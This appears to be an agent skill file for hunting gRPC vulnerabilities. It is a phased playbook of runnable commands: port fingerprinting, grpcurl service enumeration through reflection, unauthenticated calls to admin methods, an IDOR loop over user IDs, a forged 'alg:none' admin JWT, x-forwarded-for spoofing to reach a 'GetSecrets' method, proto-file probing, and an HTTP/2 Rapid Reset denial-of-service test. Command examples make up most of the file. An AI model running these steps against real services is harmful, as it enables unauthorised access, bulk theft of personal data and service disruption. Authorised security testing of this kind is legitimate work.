---
name: hunt-grpc
description: Hunt gRPC vulnerabilities — server reflection enabled (enumerate all services/methods), missing authentication on internal endpoints, plaintext gRPC over HTTP/2, internal endpoint disclosure, proto file leakage, gRPC-Web proxy injection, HTTP/2 rapid reset DoS. Use when target exposes port 443/50051 with gRPC, or when microservice architecture is detected.
sources: hackerone_public, grpc_security_research
report_count: 6
---

# HUNT-GRPC — gRPC Security

## Crown Jewel Targets

gRPC reflection enabled = full service catalog enumeration without source code.

**Highest-value findings:**
- **Reflection enabled in production** — `grpc.reflection.v1alpha.ServerReflection` service lists all methods, messages, and internal services
- **Missing auth on internal service** — gRPC service designed for internal microservice communication exposed externally without mTLS or auth metadata
- **Internal endpoint disclosure** — reflection reveals method names that expose business logic or internal data models
- **Plaintext gRPC** — gRPC over unencrypted HTTP/2 on non-standard port → credential interception
- **HTTP/2 Rapid Reset DoS (CVE-2023-44487)** — send RST_STREAM frames rapidly → server resource exhaustion

---

## Phase 1 — Fingerprint & Port Discovery

```bash
# Common gRPC ports
nmap -sV -p 50051,50052,443,9090,8080,8443 $TARGET 2>/dev/null | grep "open"

# Check HTTP/2 support (gRPC requires HTTP/2)
curl -sI --http2 https://$TARGET/ | grep -i "content-type.*grpc\|grpc-status\|h2"

# gRPC-Web proxy detection (usually on 443 via Envoy/grpc-gateway)
curl -sI "https://$TARGET/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo" | head -5

# Check for grpc-web content-type
curl -s "https://$TARGET/" -H "Content-Type: application/grpc-web+proto" | xxd | head
```

---

## Phase 2 — Service Enumeration via Reflection

```bash
# Install grpcurl
brew install grpcurl

# List all available services (reflection must be enabled)
grpcurl -plaintext $TARGET:50051 list
grpcurl -insecure $TARGET:443 list

# If reflection enabled, output looks like:
# grpc.reflection.v1alpha.ServerReflection
# user.UserService
# admin.AdminService
# payment.PaymentService

# List methods of a specific service
grpcurl -plaintext $TARGET:50051 list user.UserService
grpcurl -insecure $TARGET:443 list admin.AdminService

# Describe a method (shows request/response proto schema)
grpcurl -plaintext $TARGET:50051 describe user.UserService.GetUser
grpcurl -insecure $TARGET:443 describe admin.AdminService.DeleteUser
```

---

## Phase 3 — Call Methods Without Authentication

```bash
# Call gRPC methods without any auth metadata
grpcurl -plaintext $TARGET:50051 user.UserService/GetUser \
  -d '{"user_id": 1}'

grpcurl -plaintext $TARGET:50051 admin.AdminService/ListUsers \
  -d '{}'

# Try with different user IDs (IDOR)
for ID in 1 2 3 100 1000; do
  grpcurl -plaintext $TARGET:50051 user.UserService/GetUser \
    -d "{\"user_id\": $ID}" 2>/dev/null | head -3
done

# Enumerate admin methods
grpcurl -plaintext $TARGET:50051 describe . 2>/dev/null | grep -i "admin\|internal\|debug\|secret"
```

---

## Phase 4 — Authentication Bypass

```bash
# gRPC uses metadata headers for auth — test with no metadata
grpcurl -plaintext $TARGET:50051 admin.AdminService/GetConfig \
  -d '{}'
# If returns data without error → no auth

# Test with fake/empty JWT
grpcurl -plaintext $TARGET:50051 admin.AdminService/GetConfig \
  -H "authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ." \
  -d '{}'

# Test with internal IP header
grpcurl -plaintext $TARGET:50051 internal.InternalService/GetSecrets \
  -H "x-forwarded-for: 10.0.0.1" \
  -d '{}'
```

---

## Phase 5 — Proto File / Schema Discovery

```bash
# Check for exposed proto files
curl -s "https://$TARGET/proto/"
curl -s "https://$TARGET/api/proto/"
for proto in "user.proto" "service.proto" "api.proto" "internal.proto" "admin.proto"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET/$proto")
  [ "$STATUS" != "404" ] && echo "Found: $TARGET/$proto ($STATUS)"
done

# Check GitHub repos for proto files
gh search code --owner TARGET_ORG "syntax = proto3" --limit 10 2>/dev/null

# Proto descriptors via reflection
grpcurl -plaintext $TARGET:50051 describe user.GetUserRequest 2>/dev/null
```

---

## Phase 6 — gRPC-Web Proxy Attacks

```bash
# gRPC-Web typically runs behind Envoy proxy on port 443
# Test injection via HTTP/1.1 content-type confusion

# gRPC-Web request format
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H "Content-Type: application/grpc-web+proto" \
  -H "X-Grpc-Web: 1" \
  --data-binary $'\x00\x00\x00\x00\x04\x08\x01'

# gRPC-Web JSON (if server supports grpc-web+json)
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H "Content-Type: application/grpc-web+json" \
  -H "X-Grpc-Web: 1" \
  -d '{"user_id": 1}'
```

---

## Phase 7 — HTTP/2 Rapid Reset DoS (CVE-2023-44487)

```bash
# For PoC only — confirm vulnerability WITHOUT full DoS
# Send a small burst of HEADERS+RST_STREAM frames
# Use h2load (part of nghttp2)
brew install nghttp2

# Lightweight test (5 rapid resets — not a real attack, just detection)
h2load -n 10 -c 5 -m 10 \
  --header="content-type: application/grpc" \
  https://$TARGET/

# Check server response time degradation
# If significant slowdown → vulnerable
# Report without exploiting further
```

---

## Tools

```bash
# grpcurl — gRPC CLI client (primary tool)
brew install grpcurl

# ghz — gRPC benchmarking (for DoS PoC — use minimally)
go install github.com/bojand/ghz/cmd/ghz@latest

# grpcui — web UI for gRPC exploration
go install github.com/fullstorydev/grpcui/cmd/grpcui@latest
grpcui -plaintext $TARGET:50051

# bloomrpc — GUI gRPC client (archived but functional)
# Postman — supports gRPC with reflection
```

---

## Chain Table

| gRPC finding | Chain to | Impact |
|-------------|----------|--------|
| Reflection enabled | Enumerate all internal service methods | Full API catalog disclosure |
| Admin service no auth | Call privileged methods | Data manipulation / system access |
| IDOR via user_id | Enumerate all users' data | Mass PII exfil |
| Internal service exposed | Access microservice data directly | Tenant isolation bypass |
| Proto files disclosed | Understand internal data models | Intelligence for further attacks |

---

## Validation

✅ Reflection: `grpcurl list` returns service catalog without auth
✅ No auth: method returns data without authentication metadata
✅ IDOR: different user_id values return different users' data

**Severity:**
- Admin method no auth: Critical
- Reflection in production: Medium (info disclosure + enabler for further attacks)
- IDOR via gRPC: High
- Internal service exposed: High
